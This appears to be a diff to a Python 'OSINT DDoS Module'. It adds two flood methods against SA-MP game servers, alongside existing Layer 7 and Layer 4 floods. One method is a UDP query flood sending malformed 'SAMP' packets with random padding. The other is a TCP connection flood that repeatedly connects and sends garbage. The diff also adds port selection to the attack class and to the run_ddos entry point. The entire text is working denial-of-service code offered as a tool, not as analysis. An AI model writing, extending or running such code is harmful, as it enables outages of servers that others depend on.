@@ -1,5 +1,5 @@
 """
-0312-OSINT DDoS Module - Layer7 & Layer4 attack methods
+0312-OSINT DDoS Module - Layer7, Layer4 & SAMP attack methods
 """
 import requests
 import socket
@@ -15,14 +15,18 @@ from urllib.parse import urlparse
 class DDoSAttack:
     METHODS = [
         "GET", "POST", "HEAD", "NULL", "COOKIE", "PPS", "BYPASS",
-        "SLOW", "DYN", "BOT", "STRESS", "TCP", "UDP", "SYN"
+        "SLOW", "DYN", "BOT", "STRESS", "TCP", "UDP", "SYN",
+        "SAMPQUERY", "SAMPCONN"
     ]
 
-    def __init__(self, target):
+    def __init__(self, target, port=None):
         self.target = target
         self.parsed = urlparse(target)
         self.host = self.parsed.hostname or target
-        self.port = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
+        if port:
+            self.port = port
+        else:
+            self.port = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
         self.path = self.parsed.path or "/"
         self.is_ssl = self.parsed.scheme == "https"
         self.running = False
@@ -313,6 +317,42 @@ class DDoSAttack:
             except:
                 pass
 
+    # SAMP Methods
+    def _samp_query_flood(self):
+        # SAMP query packet: SAMP query opcode = 'i' (0x69) for info,
+        # we send garbage to force CPU parsing
+        cookie = b"SAMP"
+        while self.running:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                # Fake query with garbage
+                addr = socket.inet_aton(self.host)
+                port = struct.pack('>H', self.port)
+                # Malformed query
+                payload = cookie + b'\x69\x00\x00\x00' + random._urandom(64)
+                s.sendto(payload, (self.host, self.port))
+                s.close()
+                with self.lock:
+                    self.sent += 1
+            except:
+                pass
+
+    def _samp_conn_flood(self):
+        # SAMP connection flood - spam with fake connection packets
+        # SAMP uses TCP for actual connections, open many then reset
+        while self.running:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(2)
+                s.connect((self.host, self.port))
+                # Send garbage version/connection data
+                s.send(b'\x00\x00\x00\x00' + random._urandom(128))
+                s.close()
+                with self.lock:
+                    self.sent += 1
+            except:
+                pass
+
     def start(self, method="GET", threads=50, duration=30):
         self.running = True
         method = method.upper()
@@ -332,6 +372,8 @@ class DDoSAttack:
             "TCP": self._tcp_flood,
             "UDP": self._udp_flood,
             "SYN": self._syn_flood,
+            "SAMPQUERY": self._samp_query_flood,
+            "SAMPCONN": self._samp_conn_flood,
         }
 
         func = method_map.get(method)
@@ -358,7 +400,7 @@ class DDoSAttack:
         return {"sent": self.sent, "running": self.running}
 
 
-def run_ddos(target, method="GET", threads=50, duration=30):
-    attack = DDoSAttack(target)
+def run_ddos(target, method="GET", threads=50, duration=30, port=None):
+    attack = DDoSAttack(target, port)
     success, msg = attack.start(method, threads, duration)
     return success, msg, attack.stats()
